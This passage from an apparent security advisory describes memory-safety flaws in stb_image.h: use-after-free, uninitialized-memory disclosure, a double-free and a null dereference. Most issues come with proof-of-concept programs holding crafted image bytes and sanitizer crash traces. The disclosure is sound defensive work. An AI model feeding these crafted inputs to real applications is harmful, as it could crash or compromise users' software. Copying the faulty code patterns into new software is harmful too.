         <span class="n">memcpy</span><span class="p">(</span><span class="n">row1</span><span class="p">,</span> <span class="n">temp</span><span class="p">,</span> <span class="n">bytes_copy</span><span class="p">);</span>
         <span class="n">row0</span> <span class="o">+=</span> <span class="n">bytes_copy</span><span class="p">;</span>
         <span class="n">row1</span> <span class="o">+=</span> <span class="n">bytes_copy</span><span class="p">;</span>
         <span class="n">bytes_left</span> <span class="o">-=</span> <span class="n">bytes_copy</span><span class="p">;</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The reason for this is that <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1442C4-L1451"><code class="language-plaintext highlighter-rouge">stbi_load_gif_from_memory</code></a> calls <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1245"><code class="language-plaintext highlighter-rouge">stbi__vertical_flip_slices</code></a> [5] with the number of bytes per pixel in the loaded image - <code class="language-plaintext highlighter-rouge">comp</code>, however <code class="language-plaintext highlighter-rouge">stbi__load_gif_main</code> [4] internally <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7037-L7038">converts the image</a> to requested number of bytes per pixel.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STBIDEF</span> <span class="n">stbi_uc</span> <span class="o">*</span><span class="nf">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">stbi_uc</span> <span class="k">const</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="o">**</span><span class="n">delays</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">y</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">z</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">comp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">req_comp</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
   <span class="n">stbi__context</span> <span class="n">s</span><span class="p">;</span>
   <span class="n">stbi__start_mem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">len</span><span class="p">);</span>

   <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="n">stbi__load_gif_main</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="n">delays</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">,</span> <span class="n">comp</span><span class="p">,</span> <span class="n">req_comp</span><span class="p">);</span> <span class="c1">// [4]</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">stbi__vertically_flip_on_load</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">stbi__vertical_flip_slices</span><span class="p">(</span> <span class="n">result</span><span class="p">,</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">y</span><span class="p">,</span> <span class="o">*</span><span class="n">z</span><span class="p">,</span> <span class="o">*</span><span class="n">comp</span> <span class="p">);</span> <span class="c1">// [5]</span>
   <span class="p">}</span>

   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">stbi__load_gif_main</span><span class="p">(</span><span class="n">stbi__context</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="o">**</span><span class="n">delays</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">y</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">z</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">comp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">req_comp</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">...</span>
      <span class="c1">// do the final conversion after loading everything;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">req_comp</span> <span class="o">&amp;&amp;</span> <span class="n">req_comp</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span>
         <span class="n">out</span> <span class="o">=</span> <span class="n">stbi__convert_format</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">req_comp</span><span class="p">,</span> <span class="n">layers</span> <span class="o">*</span> <span class="n">g</span><span class="p">.</span><span class="n">w</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="n">h</span><span class="p">);</span>
</code></pre></div></div>

<h4 id="impact-1">Impact</h4>

<p>This issue may be used to leak internal memory allocation information.</p>

<h4 id="resources-1">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#define STB_IMAGE_IMPLEMENTATION
#include</span> <span class="cpf">"../stb_image.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xdf</span><span class="p">,</span><span class="mh">0x79</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span>
                            <span class="mh">0x66</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x4e</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0xda</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xf9</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="n">stbi_set_flip_vertically_on_load</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">,</span> <span class="n">channels</span><span class="p">;</span>
    <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">z</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="n">stbi_image_free</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==58950==ERROR: AddressSanitizer: heap-use-after-free on address 0x7f5f9fe18b98 at pc 0x00000049db51 bp 0x7ffdf2aed0f0 sp 0x7ffdf2aec8c0
READ of size 756 at 0x7f5f9fe18b98 thread T0
    #0 0x49db50 in __asan_memcpy /src/llvm-project/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:22:3
    #1 0x4e2608 in stbi__vertical_flip(void*, int, int, int) tests/../stb_image.h:1235:10
    #2 0x4dfaee in stbi__vertical_flip_slices(void*, int, int, int, int) tests/../stb_image.h:1252:7
    #3 0x4dea9b in stbi_load_gif_from_memory tests/../stb_image.h:1450:7
</code></pre></div></div>

<h3 id="issue-3-disclosure-of-uninitialized-memory-in-stbi__tga_load-ghsl-2023-147">Issue 3: Disclosure of uninitialized memory in <code class="language-plaintext highlighter-rouge">stbi__tga_load</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-147</code>)</h3>

<p>The <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1664"><code class="language-plaintext highlighter-rouge">stbi__getn</code></a> function reads a specified number of bytes from <code class="language-plaintext highlighter-rouge">context</code> (typically a file) into the specified buffer. In case the file stream points to the end, it returns zero. There are two places where its return value is not checked:</p>

<ol>
  <li>In <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7221"><code class="language-plaintext highlighter-rouge">stbi__hdr_load</code></a></li>
  <li>In <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L5936C10-L5936C20"><code class="language-plaintext highlighter-rouge">stbi__tga_load</code></a></li>
</ol>

<p>The first case is harder to exploit because the initialized memory is mixed in different arithmetic operations:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">stbi__hdr_convert</span><span class="p">(</span><span class="kt">float</span> <span class="o">*</span><span class="n">output</span><span class="p">,</span> <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">input</span><span class="p">,</span> <span class="kt">int</span> <span class="n">req_comp</span><span class="p">)</span>
<span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span> <span class="n">input</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
      <span class="kt">float</span> <span class="n">f1</span><span class="p">;</span>
      <span class="c1">// Exponent</span>
      <span class="n">f1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">float</span><span class="p">)</span> <span class="n">ldexp</span><span class="p">(</span><span class="mf">1.0</span><span class="n">f</span><span class="p">,</span> <span class="n">input</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">8</span><span class="p">));</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">req_comp</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">)</span>
         <span class="n">output</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">input</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">input</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">*</span> <span class="n">f1</span> <span class="o">/</span> <span class="mi">3</span><span class="p">;</span>
      <span class="k">else</span> <span class="p">{</span>
         <span class="n">output</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">f1</span><span class="p">;</span>
         <span class="n">output</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="n">f1</span><span class="p">;</span>
         <span class="n">output</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="n">f1</span><span class="p">;</span>
      <span class="p">}</span>
</code></pre></div></div>

<p>However the second case in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L5936C10-L5936C20"><code class="language-plaintext highlighter-rouge">stbi__tga_load</code></a> gives much powerful capabilities because the attacker can control the size of the uninitialized buffer ([1] and [2]) and the uninitialized memory can be loaded into the image without transformations.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
   <span class="n">tga_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">stbi__malloc_mad3</span><span class="p">(</span><span class="n">tga_width</span><span class="p">,</span> <span class="n">tga_height</span><span class="p">,</span> <span class="n">tga_comp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// [1]</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tga_data</span><span class="p">)</span> <span class="k">return</span> <span class="nf">stbi__errpuc</span><span class="p">(</span><span class="s">"outofmem"</span><span class="p">,</span> <span class="s">"Out of memory"</span><span class="p">);</span>

   <span class="c1">// skip to the data's starting position (offset usually = 0)</span>
   <span class="n">stbi__skip</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">tga_offset</span> <span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">tga_indexed</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">tga_is_RLE</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">tga_rgb16</span> <span class="p">)</span> <span class="p">{</span>
      <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">tga_height</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
         <span class="kt">int</span> <span class="n">row</span> <span class="o">=</span> <span class="n">tga_inverted</span> <span class="o">?</span> <span class="n">tga_height</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">:</span> <span class="n">i</span><span class="p">;</span>
         <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">tga_row</span> <span class="o">=</span> <span class="n">tga_data</span> <span class="o">+</span> <span class="n">row</span><span class="o">*</span><span class="n">tga_width</span><span class="o">*</span><span class="n">tga_comp</span><span class="p">;</span>
         <span class="n">stbi__getn</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">tga_row</span><span class="p">,</span> <span class="n">tga_width</span> <span class="o">*</span> <span class="n">tga_comp</span><span class="p">);</span> <span class="c1">// [2]</span>
      <span class="p">}</span>
<span class="p">...</span>
</code></pre></div></div>

<h4 id="impact-2">Impact</h4>

<p>Information disclosure.</p>

<h4 id="resources-2">Resources</h4>

<p>To reproduce the issue in <code class="language-plaintext highlighter-rouge">stbi__hdr_load</code>:</p>

<ol>
  <li>Make MSAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#define STB_IMAGE_IMPLEMENTATION
#include</span> <span class="cpf">"../stb_image.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x42</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span>
                            <span class="mh">0x4d</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x3d</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="mh">0x2d</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span>
                            <span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span>
                            <span class="mh">0x0a</span><span class="p">,</span><span class="mh">0x2d</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x2b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x30</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">channels</span><span class="p">;</span>
    <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="n">stbi_image_free</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Set breakpoint at <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7132"><code class="language-plaintext highlighter-rouge">stbi__hdr_convert</code></a> and run the program. The second hit is before the usage of the uninitialized memory.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==118355==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x5f15fa in stbi__hdr_convert(float*, unsigned char*, int) tests/../stb_image.h:7132:9
    #1 0x4e54be in stbi__hdr_load(stbi__context*, int*, int*, int*, int, stbi__result_info*) tests/../stb_image.h:7222:13
    #2 0x4b1a94 in stbi__loadf_main(stbi__context*, int*, int*, int*, int) tests/../stb_image.h:1464:25
    #3 0x4b1375 in stbi_loadf_from_memory tests/../stb_image.h:1480:11
</code></pre></div></div>

<h3 id="issue-4-double-free-in-stbi__load_gif_main_outofmem-ghsl-2023-148">Issue 4: Double-free in <code class="language-plaintext highlighter-rouge">stbi__load_gif_main_outofmem</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-148</code>)</h3>

<p>A crafted image file can trigger <code class="language-plaintext highlighter-rouge">stbi__load_gif_main_outofmem</code> attempt to double-free the <code class="language-plaintext highlighter-rouge">out</code> variable. [1]</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">stbi__load_gif_main_outofmem</span><span class="p">(</span><span class="n">stbi__gif</span> <span class="o">*</span><span class="n">g</span><span class="p">,</span> <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span> <span class="kt">int</span> <span class="o">**</span><span class="n">delays</span><span class="p">)</span>
<span class="p">{</span>
   <span class="n">STBI_FREE</span><span class="p">(</span><span class="n">g</span><span class="o">-&gt;</span><span class="n">out</span><span class="p">);</span>
   <span class="n">STBI_FREE</span><span class="p">(</span><span class="n">g</span><span class="o">-&gt;</span><span class="n">history</span><span class="p">);</span>
   <span class="n">STBI_FREE</span><span class="p">(</span><span class="n">g</span><span class="o">-&gt;</span><span class="n">background</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="n">STBI_FREE</span><span class="p">(</span><span class="n">out</span><span class="p">);</span> <span class="c1">// [1] Double-free</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">delays</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">delays</span><span class="p">)</span> <span class="n">STBI_FREE</span><span class="p">(</span><span class="o">*</span><span class="n">delays</span><span class="p">);</span>
   <span class="k">return</span> <span class="n">stbi__errpuc</span><span class="p">(</span><span class="s">"outofmem"</span><span class="p">,</span> <span class="s">"Out of memory"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This happens in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6993-L6995"><code class="language-plaintext highlighter-rouge">stbi__load_gif_main</code></a> because when the <code class="language-plaintext highlighter-rouge">layers * stride</code> is zero [2] the behavior is implementation defined, but common that <code class="language-plaintext highlighter-rouge">realloc</code> frees the old memory and returns null pointer. Since it attempts to double-free the memory [3] a few lines below the first “free” [2], the issue can be potentially exploited only in a multi-threaded environment.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
 <span class="kt">void</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">stbi_uc</span><span class="o">*</span><span class="p">)</span> <span class="n">STBI_REALLOC_SIZED</span><span class="p">(</span> <span class="n">out</span><span class="p">,</span> <span class="n">out_size</span><span class="p">,</span> <span class="n">layers</span> <span class="o">*</span> <span class="n">stride</span> <span class="p">);</span> <span class="c1">// [2]</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tmp</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">stbi__load_gif_main_outofmem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">delays</span><span class="p">);</span> <span class="c1">// [3]</span>
<span class="p">...</span>
</code></pre></div></div>

<h4 id="impact-3">Impact</h4>

<p>This issue may lead to code execution.</p>

<h4 id="resources-3">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#define STB_IMAGE_IMPLEMENTATION
#include</span> <span class="cpf">"../stb_image.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span><span class="mh">0xdc</span><span class="p">,</span>
                            <span class="mh">0x04</span><span class="p">,</span><span class="mh">0xfc</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">,</span> <span class="n">channels</span><span class="p">;</span>
    <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">z</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="n">stbi_image_free</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==145841==ERROR: AddressSanitizer: attempting double-free on 0x602000000070 in thread T0:
    #0 0x49e522 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3
    #1 0x4eb732 in stbi__load_gif_main_outofmem(stbi__gif*, unsigned char*, int**) tests/../stb_image.h:6957:13
    #2 0x4df18f in stbi__load_gif_main(stbi__context*, int**, int*, int*, int*, int*, int) tests/../stb_image.h:6995:26
    #3 0x4de8bd in stbi_load_gif_from_memory tests/../stb_image.h:1448:30
</code></pre></div></div>

<h3 id="issue-5-null-pointer-dereference-in-stbi__convert_format-ghsl-2023-149">Issue 5: Null pointer dereference in <code class="language-plaintext highlighter-rouge">stbi__convert_format</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-149</code>)</h3>

<p>A crafted image file can trigger null pointer access in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1786"><code class="language-plaintext highlighter-rouge">stbi__convert_format</code></a> where <code class="language-plaintext highlighter-rouge">src</code> is null. It happens when <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6528-L6531"><code class="language-plaintext highlighter-rouge">stbi__pic_load_core</code></a> in <code class="language-plaintext highlighter-rouge">stbi__pic_load</code> fails, the <code class="language-plaintext highlighter-rouge">result</code> is set to zero [1], but the flow continues [2].</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">stbi__pic_load_core</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">comp</span><span class="p">,</span> <span class="n">result</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">STBI_FREE</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
      <span class="n">result</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="c1">// [1]</span>
   <span class="p">}</span>
   <span class="o">*</span><span class="n">px</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
   <span class="o">*</span><span class="n">py</span> <span class="o">=</span> <span class="n">y</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">req_comp</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="n">req_comp</span> <span class="o">=</span> <span class="o">*</span><span class="n">comp</span><span class="p">;</span>
   <span class="n">result</span><span class="o">=</span><span class="n">stbi__convert_format</span><span class="p">(</span><span class="n">result</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">req_comp</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">);</span> <span class="c1">// [2]</span>
</code></pre></div></div>

<h4 id="impact-4">Impact</h4>

<p>This issue may lead to denial of service.</p>

<h4 id="resources-4">Resources</h4>

<p>To reproduce the issue:</p>

